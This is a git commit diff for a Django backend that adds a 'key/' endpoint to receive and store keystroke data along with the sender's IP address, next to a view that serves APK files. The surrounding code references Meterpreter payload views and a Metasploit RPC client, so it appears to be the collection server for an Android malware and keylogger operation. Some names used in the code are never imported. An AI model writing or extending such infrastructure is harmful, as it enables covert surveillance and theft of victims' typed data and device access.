d2ef346cfad1bf0706bfb56f081b3a76dd53ed9f
Gap6769 <david.aviles.brun@gmail.com>
2022-06-26 20:35:52 -0400

    ok

--- back/urls.py
+++ back/urls.py
@@ -2,10 +2,10 @@ from platform import release
 from django.urls import path, include
 from django.contrib import admin
 from django.urls import path
-from back.views import testViews
-from back.views import meterpreter_payload_views
+from back.views import meterpreter_payload_views, testViews, keylogger_views
 
 urlpatterns = [
     path("list/", testViews.ReleaseView.as_view()),
     path("get_apk_file/<str:apk_name>/", meterpreter_payload_views.get_apk_file),
+    path("key/", keylogger_views.key),
 ]
--- back/views/keylogger_views.py
+++ back/views/keylogger_views.py
@@ -8,5 +8,21 @@ import threading
 import os
 import requests
 import json
+from back.models import Messages
 
 from pymetasploit3.msfrpc import MsfRpcClient
+
+
+def get_apk_file(request, apk_name):
+    apk_file = open(f"{apk_name}.apk", "rb")
+    response = HttpResponse(apk_file, content_type="application/vnd.android.package-archive")
+    response["Content-Disposition"] = 'attachment; filename="android5.apk"'
+    return response
+
+
+def key(request):
+    try:
+        Messages.objects.create(message=request.POST["body"], ip=request.META["REMOTE_ADDR"])
+        return Response("Ok", status=status.HTTP_200_OK)
+    except:
+        return Response("Error", status=status.HTTP_400_BAD_REQUEST)
